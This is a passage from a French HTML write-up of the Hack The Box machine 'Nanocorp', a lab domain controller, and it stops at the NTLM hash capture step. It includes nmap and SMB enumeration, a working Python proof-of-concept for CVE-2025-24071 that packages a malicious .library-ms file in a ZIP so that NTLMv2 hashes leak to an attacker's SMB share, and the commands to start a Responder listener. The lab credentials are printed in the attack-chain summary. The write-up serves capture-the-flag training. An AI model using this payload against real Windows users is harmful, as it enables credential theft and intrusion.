+                    <a href="#-m%c3%a9thodes-dex%c3%a9cution-winrmexec" aria-label="🎯 Méthodes d&rsquo;Exécution winrmexec">🎯 Méthodes d&rsquo;Exécution winrmexec</a></li>
+                <li>
+                    <a href="#-user-flag-via-winrmexec" aria-label="🏁 User Flag via winrmexec">🏁 User Flag via winrmexec</a></li>
+                <li>
+                    <a href="#-obtention-dun-reverse-shell" aria-label="🔄 Obtention d&rsquo;un Reverse Shell">🔄 Obtention d&rsquo;un Reverse Shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#9-privilege-escalation" aria-label="9️⃣ PRIVILEGE ESCALATION">9️⃣ PRIVILEGE ESCALATION</a><ul>
+                        
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-post-exploitation" aria-label="🔍 Énumération Post-Exploitation">🔍 Énumération Post-Exploitation</a></li>
+                <li>
+                    <a href="#-recherche-de-vecteurs-descalade" aria-label="🔎 Recherche de Vecteurs d&rsquo;Escalade">🔎 Recherche de Vecteurs d&rsquo;Escalade</a></li>
+                <li>
+                    <a href="#-techniques-possibles" aria-label="🛠️ Techniques Possibles">🛠️ Techniques Possibles</a><ul>
+                        
+                <li>
+                    <a href="#1-seimpersonateprivilege-abuse-si-pr%c3%a9sent" aria-label="1️⃣ SeImpersonatePrivilege Abuse (si présent)">1️⃣ SeImpersonatePrivilege Abuse (si présent)</a></li>
+                <li>
+                    <a href="#2-runascs-pour-escalade-lat%c3%a9rale" aria-label="2️⃣ RunasCs pour Escalade Latérale">2️⃣ RunasCs pour Escalade Latérale</a></li>
+                <li>
+                    <a href="#3-scheduled-tasks-abuse" aria-label="3️⃣ Scheduled Tasks Abuse">3️⃣ Scheduled Tasks Abuse</a></li>
+                <li>
+                    <a href="#4-bloodhound-enumeration" aria-label="4️⃣ BloodHound Enumeration">4️⃣ BloodHound Enumeration</a></li>
+                <li>
+                    <a href="#5-dcsync-attack-si-permissions-pr%c3%a9sentes" aria-label="5️⃣ DCSync Attack (si permissions présentes)">5️⃣ DCSync Attack (si permissions présentes)</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#-root-flag" aria-label="🔟 ROOT FLAG">🔟 ROOT FLAG</a><ul>
+                        
+                <li>
+                    <a href="#sc%c3%a9nario-1--via-seimpersonate--printspoofer" aria-label="Scénario 1 : Via SeImpersonate &#43; PrintSpoofer">Scénario 1 : Via SeImpersonate + PrintSpoofer</a></li>
+                <li>
+                    <a href="#sc%c3%a9nario-2--via-dcsync" aria-label="Scénario 2 : Via DCSync">Scénario 2 : Via DCSync</a></li>
+                <li>
+                    <a href="#sc%c3%a9nario-3--acc%c3%a8s-direct" aria-label="Scénario 3 : Accès Direct">Scénario 3 : Accès Direct</a></li></ul>
+                </li>
+                <li>
+                    <a href="#11-d%c3%a9tection--mitigation" aria-label="1️⃣1️⃣ DÉTECTION &amp; MITIGATION">1️⃣1️⃣ DÉTECTION &amp; MITIGATION</a><ul>
+                        
+                <li>
+                    <a href="#-d%c3%a9tection-winrmexec--rpc-execution" aria-label="🛡️ Détection winrmexec / RPC Execution">🛡️ Détection winrmexec / RPC Execution</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-cve-2025-24071" aria-label="🛡️ Détection CVE-2025-24071">🛡️ Détection CVE-2025-24071</a></li>
+                <li>
+                    <a href="#-d%c3%a9tection-changement-de-mot-de-passe" aria-label="🛡️ Détection Changement de Mot de Passe">🛡️ Détection Changement de Mot de Passe</a></li></ul>
+                </li>
+                <li>
+                    <a href="#12-timeline" aria-label="1️⃣2️⃣ TIMELINE">1️⃣2️⃣ TIMELINE</a></li>
+                <li>
+                    <a href="#13-outils-utilis%c3%a9s" aria-label="1️⃣3️⃣ OUTILS UTILISÉS">1️⃣3️⃣ OUTILS UTILISÉS</a></li>
+                <li>
+                    <a href="#14-le%c3%a7ons-apprises" aria-label="1️⃣4️⃣ LEÇONS APPRISES">1️⃣4️⃣ LEÇONS APPRISES</a><ul>
+                        
+                <li>
+                    <a href="#-points-cl%c3%a9s-techniques" aria-label="✅ Points Clés Techniques">✅ Points Clés Techniques</a></li>
+                <li>
+                    <a href="#-vuln%c3%a9rabilit%c3%a9s-identifi%c3%a9es" aria-label="❌ Vulnérabilités Identifiées">❌ Vulnérabilités Identifiées</a></li>
+                <li>
+                    <a href="#-diff%c3%a9rences-winrm-vs-winrmexec" aria-label="🎓 Différences WinRM vs winrmexec">🎓 Différences WinRM vs winrmexec</a></li>
+                <li>
+                    <a href="#-techniques-compl%c3%a9mentaires" aria-label="📚 Techniques Complémentaires">📚 Techniques Complémentaires</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-ressources" aria-label="📚 RESSOURCES">📚 RESSOURCES</a><ul>
+                        
+                <li>
+                    <a href="#documentation-officielle" aria-label="Documentation Officielle">Documentation Officielle</a></li>
+                <li>
+                    <a href="#outils-et-frameworks" aria-label="Outils et Frameworks">Outils et Frameworks</a></li>
+                <li>
+                    <a href="#articles-et-recherches" aria-label="Articles et Recherches">Articles et Recherches</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-sch%c3%a9ma-dexploitation" aria-label="📊 SCHÉMA D&rsquo;EXPLOITATION">📊 SCHÉMA D&rsquo;EXPLOITATION</a></li>
+                <li>
+                    <a href="#-flags" aria-label="🏁 FLAGS">🏁 FLAGS</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="-résumé-exécutif">📋 Résumé Exécutif<a hidden class="anchor" aria-hidden="true" href="#-résumé-exécutif">#</a></h2>
+<p><strong>Machine :</strong> Nanocorp (10.10.11.93)<br>
+<strong>OS :</strong> Windows Server 2022 (Domain Controller)<br>
+<strong>Domaine :</strong> nanocorp.htb / dc01.nanocorp.htb<br>
+<strong>Difficulté :</strong> Hard<br>
+<strong>Points Clés :</strong> CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass</p>
+<h3 id="-chaîne-dattaque-complète">🔗 Chaîne d&rsquo;Attaque Complète<a hidden class="anchor" aria-hidden="true" href="#-chaîne-dattaque-complète">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zed" data-lang="zed"><span style="display:flex;"><span>Port <span style="color:#960050;background-color:#1e0010">80</span> <span style="color:#f92672">-</span> Apache/PHP Web Server
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [CVE<span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">2025</span><span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">24071</span> <span style="color:#f92672">-</span> Malicious .library<span style="color:#f92672">-</span>ms in ZIP]
+</span></span><span style="display:flex;"><span>Responder capture (port <span style="color:#960050;background-color:#1e0010">445</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [NTLMv2 hash capture]
+</span></span><span style="display:flex;"><span>web_svc hash <span style="color:#960050;background-color:#1e0010">→</span> Hashcat crack
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [web_svc<span style="color:#f92672">:</span>dksehdgh712<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">@#</span>]
+</span></span><span style="display:flex;"><span>LDAP/AD Enumeration
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [Découverte groupe IT_Support <span style="color:#f92672">+</span> monitoring_svc]
+</span></span><span style="display:flex;"><span>bloodyAD <span style="color:#f92672">-</span> Add web_svc to IT_Support
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [GenericAll <span style="color:#66d9ef">permission</span> sur monitoring_svc]
+</span></span><span style="display:flex;"><span>bloodyAD <span style="color:#f92672">-</span> Change password monitoring_svc
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [monitoring_svc<span style="color:#f92672">:</span>PassW0rd<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">2025</span>]
+</span></span><span style="display:flex;"><span>Evil<span style="color:#f92672">-</span>WinRM bloqué <span style="color:#960050;background-color:#1e0010">❌</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [Restrictions réseau ou GPO]
+</span></span><span style="display:flex;"><span>winrmexec <span style="color:#f92672">-</span> Bypass restrictions
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [Alternative RPC execution method]
+</span></span><span style="display:flex;"><span>Remote Code Execution (monitoring_svc)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span> [Shell ou command execution]
+</span></span><span style="display:flex;"><span>Privilege Escalation
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>SYSTEM/Administrator access <span style="color:#960050;background-color:#1e0010">→</span> Flags
+</span></span></code></pre></div><hr>
+<h2 id="1-reconnaissance">1️⃣ RECONNAISSANCE<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance">#</a></h2>
+<h3 id="-scan-nmap">🔍 Scan Nmap<a hidden class="anchor" aria-hidden="true" href="#-scan-nmap">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan rapide des ports</span>
+</span></span><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.11.93 -vv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scan détaillé</span>
+</span></span><span style="display:flex;"><span>nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV -A 10.10.11.93 -oN nmap.txt
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Rôle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>Simple DNS Plus</td>
+<td>Résolution de noms</td>
+</tr>
+<tr>
+<td><strong>80</strong></td>
+<td><strong>HTTP</strong></td>
+<td><strong>Apache 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)</strong></td>
+<td><strong>Web server (inhabituel sur DC)</strong></td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>Microsoft Windows Kerberos</td>
+<td>Authentification AD</td>
+</tr>
+<tr>
+<td>135</td>
+<td>MSRPC</td>
+<td>Microsoft Windows RPC</td>
+<td>Communication RPC</td>
+</tr>
+<tr>
+<td>139</td>
+<td>NetBIOS-SSN</td>
+<td>Microsoft Windows netbios-ssn</td>
+<td>Partage fichiers (legacy)</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>Microsoft AD LDAP</td>
+<td>Annuaire Active Directory</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB</td>
+<td>Microsoft-DS</td>
+<td>Partage fichiers moderne</td>
+</tr>
+<tr>
+<td>464</td>
+<td>kpasswd5</td>
+<td>-</td>
+<td>Changement mot de passe Kerberos</td>
+</tr>
+<tr>
+<td>593</td>
+<td>HTTP-RPC</td>
+<td>Microsoft Windows RPC over HTTP</td>
+<td>RPC via HTTP</td>
+</tr>
+<tr>
+<td>636</td>
+<td>LDAPS</td>
+<td>tcpwrapped</td>
+<td>LDAP sécurisé (SSL/TLS)</td>
+</tr>
+<tr>
+<td>3268</td>
+<td>Global Catalog</td>
+<td>Microsoft AD LDAP</td>
+<td>Catalogue global AD</td>
+</tr>
+<tr>
+<td>3269</td>
+<td>GC-SSL</td>
+<td>tcpwrapped</td>
+<td>Catalogue global sécurisé</td>
+</tr>
+<tr>
+<td>5986</td>
+<td>WinRM-SSL</td>
+<td>Microsoft HTTPAPI 2.0</td>
+<td>PowerShell Remoting (HTTPS)</td>
+</tr>
+<tr>
+<td>9389</td>
+<td>MC-NMF</td>
+<td>.NET Message Framing</td>
+<td>AD Web Services</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Identification :</strong></p>
+<ul>
+<li><strong>Domaine :</strong> nanocorp.htb</li>
+<li><strong>Hostname :</strong> dc01.nanocorp.htb</li>
+<li><strong>Rôle :</strong> Domain Controller Windows Server 2022</li>
+<li><strong>Particularité :</strong> Apache + PHP sur port 80 (très inhabituel pour un DC !)</li>
+</ul>
+<p><strong>⏰ Décalage Horaire :</strong> -1 seconde (clock-skew: -1s)</p>
+<blockquote>
+<p><strong>✅ Bon Point :</strong> Décalage horaire négligeable, pas de problème Kerberos prévu.</p>
+</blockquote>
+<p><strong>🔍 Observations Critiques :</strong></p>
+<ol>
+<li>
+<p><strong>Apache sur un DC Windows = Configuration non standard</strong></p>
+<ul>
+<li>Potentiellement une application web custom</li>
+<li>Vecteur d&rsquo;attaque probable</li>
+</ul>
+</li>
+<li>
+<p><strong>SMBv2/v3 avec signature obligatoire</strong></p>
+<ul>
+<li><code>Message signing enabled and required</code></li>
+<li>Limite les attaques SMB relay classiques</li>
+</ul>
+</li>
+<li>
+<p><strong>WinRM sur port 5986 (HTTPS uniquement)</strong></p>
+<ul>
+<li>Pas de port 5985 (HTTP)</li>
+<li>Certificat: <code>dc01.nanocorp.htb</code></li>
+<li><strong>⚠️ Potentiellement restreint par GPO/Firewall</strong></li>
+</ul>
+</li>
+</ol>
+<h3 id="-configuration-etchosts">📝 Configuration /etc/hosts<a hidden class="anchor" aria-hidden="true" href="#-configuration-etchosts">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.11.93 dc01.nanocorp.htb nanocorp.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><hr>
+<h2 id="2-énumération-web--smb">2️⃣ ÉNUMÉRATION WEB &amp; SMB<a hidden class="anchor" aria-hidden="true" href="#2-énumération-web--smb">#</a></h2>
+<h3 id="-service-http---port-80">🌐 Service HTTP - Port 80<a hidden class="anchor" aria-hidden="true" href="#-service-http---port-80">#</a></h3>
+<p><strong>Redirection automatique :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>firefox http://10.10.11.93
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Redirige vers: http://nanocorp.htb/</span>
+</span></span></code></pre></div><p><strong>🎯 Page d&rsquo;accueil :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>NanoCorp - Corporate Solutions
+</span></span><span style="display:flex;"><span>===============================
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Home] [About] [Services] [Contact]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enterprise-grade technology solutions
+</span></span></code></pre></div><h3 id="-directory-enumeration">🔎 Directory Enumeration<a hidden class="anchor" aria-hidden="true" href="#-directory-enumeration">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirb http://nanocorp.htb
+</span></span></code></pre></div><p><strong>Résultats intéressants :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/css/</code></td>
+<td>200</td>
+<td>Directory listable</td>
+</tr>
+<tr>
+<td><code>/img/</code></td>
+<td>200</td>
+<td>Directory listable</td>
+</tr>
+<tr>
+<td><code>/js/</code></td>
+<td>200</td>
+<td>Directory listable</td>
+</tr>
+<tr>
+<td><code>/index.html</code></td>
+<td>200</td>
+<td>Page principale</td>
+</tr>
+<tr>
+<td><code>/phpmyadmin</code></td>
+<td>403</td>
+<td>Forbidden (existe mais inaccessible)</td>
+</tr>
+<tr>
+<td><code>/examples</code></td>
+<td>503</td>
+<td>Service Unavailable</td>
+</tr>
+</tbody>
+</table>
+<p><strong>💡 Découverte :</strong></p>
+<ul>
+<li>Site statique sans fonctionnalité apparente</li>
+<li>Pas de formulaires, pas d&rsquo;upload</li>
+<li>Aucun vecteur d&rsquo;attaque évident côté web</li>
+</ul>
+<h3 id="-énumération-smb">📂 Énumération SMB<a hidden class="anchor" aria-hidden="true" href="#-énumération-smb">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //10.10.11.93/ -N
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>    ---------       ----      -------
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 for workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.11.93 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p><strong>🔍 Analyse :</strong></p>
+<ul>
+<li><strong>Anonymous login successful</strong> = Connexion null session autorisée</li>
+<li>Mais <strong>aucun partage visible</strong> en anonymous</li>
+<li>SMBv1 désactivé (bonne pratique de sécurité)</li>
+</ul>
+<p><strong>💡 Impasse :</strong> SMB ne donne pas d&rsquo;accès initial sans credentials.</p>
+<hr>
+<h2 id="3-exploitation---cve-2025-24071">3️⃣ EXPLOITATION - CVE-2025-24071<a hidden class="anchor" aria-hidden="true" href="#3-exploitation---cve-2025-24071">#</a></h2>
+<h3 id="-quest-ce-que-cve-2025-24071-">🎓 Qu&rsquo;est-ce que CVE-2025-24071 ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-cve-2025-24071-">#</a></h3>
+<p><strong>CVE-2025-24071</strong> est une vulnérabilité de <strong>Windows File Explorer</strong> qui permet la <strong>divulgation de hash NTLM</strong> via des fichiers <code>.library-ms</code> malveillants.</p>
+<p><strong>Fonctionnement :</strong></p>
+<ol>
+<li>
+<p><strong>Fichier .library-ms</strong> = Format XML de &ldquo;bibliothèque&rdquo; Windows</p>
+<ul>
+<li>Pointe vers un emplacement de fichiers (local ou réseau)</li>
+<li>Exemple légitime : &ldquo;Mes Documents&rdquo;, &ldquo;Mes Images&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>Exploitation :</strong></p>
+<ul>
+<li>Créer un fichier <code>.library-ms</code> pointant vers <code>\\ATTACKER_IP\share</code></li>
+<li>Compresser dans un fichier ZIP</li>
+<li>Lorsque la victime <strong>extrait</strong> le ZIP → Windows Explorer tente automatiquement de se connecter au partage SMB</li>
+<li><strong>Authentification NTLM automatique</strong> = Hash NTLM envoyé à l&rsquo;attaquant !</li>
+</ul>
+</li>
+<li>
+<p><strong>Conditions requises :</strong></p>
+<ul>
+<li>Victime doit extraire le fichier ZIP</li>
+<li>Aucune interaction supplémentaire nécessaire</li>
+<li>Fonctionne sur Windows 10/11</li>
+</ul>
+</li>
+</ol>
+<p><strong>Schéma d&rsquo;attaque :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Attaquant]                    [Victime Windows]
+</span></span><span style="display:flex;"><span>     |                                |
+</span></span><span style="display:flex;"><span>     | 1. Créer malicious.library-ms |
+</span></span><span style="display:flex;"><span>     |    (pointe vers \\10.10.16.3\share)
+</span></span><span style="display:flex;"><span>     |                                |
+</span></span><span style="display:flex;"><span>     | 2. Compresser en ZIP          |
+</span></span><span style="display:flex;"><span>     |--------------------------------&gt;| 3. Victime extrait ZIP
+</span></span><span style="display:flex;"><span>     |                                |
+</span></span><span style="display:flex;"><span>     |                                | 4. Windows Explorer lit .library-ms
+</span></span><span style="display:flex;"><span>     |                                |
+</span></span><span style="display:flex;"><span>     |                                | 5. Tentative connexion SMB
+</span></span><span style="display:flex;"><span>     |                                |    \\10.10.16.3\share
+</span></span><span style="display:flex;"><span>     | 6. NTLM Authentication Request |
+</span></span><span style="display:flex;"><span>     |&lt;--------------------------------|
+</span></span><span style="display:flex;"><span>     |                                |
+</span></span><span style="display:flex;"><span>     | 7. Hash NTLMv2 capturé !      |
+</span></span></code></pre></div><h3 id="-préparation-du-payload">🛠️ Préparation du Payload<a hidden class="anchor" aria-hidden="true" href="#-préparation-du-payload">#</a></h3>
+<p><strong>Script d&rsquo;exploitation (CVE-2025-24071) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat PoC.py
+</span></span></code></pre></div><p><strong>Code du POC :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE-2025-24071 - Windows .library-ms NTLM Hash Disclosure</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pathlib <span style="color:#f92672">import</span> Path
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_library_ms</span>(ip: str, filename: str, output_dir: Path) <span style="color:#f92672">-&gt;</span> Path:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Creates a malicious .library-ms file pointing to an attacker&#39;s SMB server.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;libraryDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;searchConnectorDescriptionList&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;searchConnectorDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;simpleLocation&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;url&gt;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">shared&lt;/url&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/simpleLocation&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/searchConnectorDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/searchConnectorDescriptionList&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/libraryDescription&gt;&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    output_file <span style="color:#f92672">=</span> output_dir <span style="color:#f92672">/</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">.library-ms&#34;</span>
+</span></span><span style="display:flex;"><span>    output_file<span style="color:#f92672">.</span>write_text(payload, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_zip</span>(library_file: Path, output_zip: Path):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Packages the .library-ms file into a ZIP archive.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(output_zip, <span style="color:#e6db74">&#39;w&#39;</span>, zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED) <span style="color:#66d9ef">as</span> archive:
+</span></span><span style="display:flex;"><span>        archive<span style="color:#f92672">.</span>write(library_file, arcname<span style="color:#f92672">=</span>library_file<span style="color:#f92672">.</span>name)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Created ZIP: </span><span style="color:#e6db74">{</span>output_zip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><strong>Génération du payload :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 PoC.py -i 10.10.16.3 -n keyll0ger
+</span></span></code></pre></div><p><strong>Sortie :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Generating malicious .library-ms file...
+</span></span><span style="display:flex;"><span>[+] Created ZIP: output/keyll0ger.zip
+</span></span><span style="display:flex;"><span>[-] Removed intermediate .library-ms file
+</span></span><span style="display:flex;"><span>[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
+</span></span></code></pre></div><p><strong>Fichier généré :</strong> <code>output/keyll0ger.zip</code></p>
+<p><strong>Contenu du ZIP (keyll0ger.library-ms) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;libraryDescription&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;searchConnectorDescriptionList&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;searchConnectorDescription&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;simpleLocation&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url&gt;</span>\\10.10.16.3\shared<span style="color:#f92672">&lt;/url&gt;</span>  ⬅️ SMB vers notre IP
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/simpleLocation&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/searchConnectorDescription&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/searchConnectorDescriptionList&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/libraryDescription&gt;</span>
+</span></span></code></pre></div><h3 id="-préparation-du-listener">🎣 Préparation du Listener<a hidden class="anchor" aria-hidden="true" href="#-préparation-du-listener">#</a></h3>
+<p><strong>Lancement de Responder :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0
+</span></span></code></pre></div><p><strong>Responder démarre les services :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[+] Servers:
+</span></span><span style="display:flex;"><span>    HTTP server [ON]
+</span></span><span style="display:flex;"><span>    HTTPS server [ON]
+</span></span><span style="display:flex;"><span>    SMB server [ON]        ⬅️ Capture NTLM
+</span></span><span style="display:flex;"><span>    Kerberos server [ON]
+</span></span><span style="display:flex;"><span>    LDAP server [ON]
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC [tun0]
+</span></span><span style="display:flex;"><span>    Responder IP [10.10.16.3]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Listening for events...
+</span></span></code></pre></div><h3 id="-capture-du-hash-ntlmv2">🎉 Capture du Hash NTLMv2<a hidden class="anchor" aria-hidden="true" href="#-capture-du-hash-ntlmv2">#</a></h3>
+<p><strong>Responder capture :</strong></p>
